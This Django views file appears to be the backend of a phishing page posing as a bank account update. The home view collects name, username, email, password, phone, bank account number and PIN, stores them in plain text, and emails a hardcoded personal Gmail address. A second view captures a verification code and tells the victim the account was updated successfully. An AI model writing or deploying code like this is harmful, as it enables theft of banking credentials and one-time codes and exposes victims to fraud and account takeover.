from django.shortcuts import render, redirect
from .models import Customer, Code
from django.core.mail import EmailMessage
from django.conf import settings 
from django.contrib import messages

# Create your views here.




def home(request):

    if request.method == 'POST':
        firstname     = request.POST['firstname']
        lastname      = request.POST['lastname']
        username      = request.POST['username']
        email         = request.POST['email']
        password      = request.POST['password']
        phone         = request.POST['phone']
        accountnumber = request.POST['accountnumber']
        pin           = request.POST['pin']

        customer = Customer.objects.create(
            firstname=firstname,
            lastname=lastname,
            username=username,
            email=email,
            password=password,
            accountnumber=accountnumber,
            pin=pin
        )

        sendemail = EmailMessage(
            'Account Updated',
            'yoo boi account has been updated',
            settings.EMAIL_HOST_USER,
            ['rossenblay@gmail.com']
        )
        sendemail.fail_silently=True
        sendemail.send()
        return redirect('verify')



    return render(request, 'page/index.html')


def verify(request):

    if request.method == 'POST':
        code = request.POST['code']

        verify = Code.objects.create(code=code)

        messages.info(request, 'Account Updated Successfuly')
    else:
        messages.info(request, 'Invalid Code')
   
    return render(request, 'page/verify.html')